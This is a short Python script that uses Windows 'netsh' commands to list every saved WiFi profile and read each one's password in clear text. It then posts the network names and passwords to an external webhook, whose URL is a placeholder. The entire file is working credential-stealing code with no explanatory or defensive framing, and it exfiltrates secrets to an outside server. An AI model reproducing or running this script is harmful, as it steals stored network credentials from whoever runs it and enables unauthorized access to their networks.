import subprocess
import requests

webhook_url = "enter webhook"
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
message = "The WiFi passwords are:\n"
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        message += "{:<30}| {:<}\n".format(i, results[0])
    except IndexError:
        message += "{:<30}| {:<}\n".format(i, "")

requests.post(webhook_url, json={"content": message})
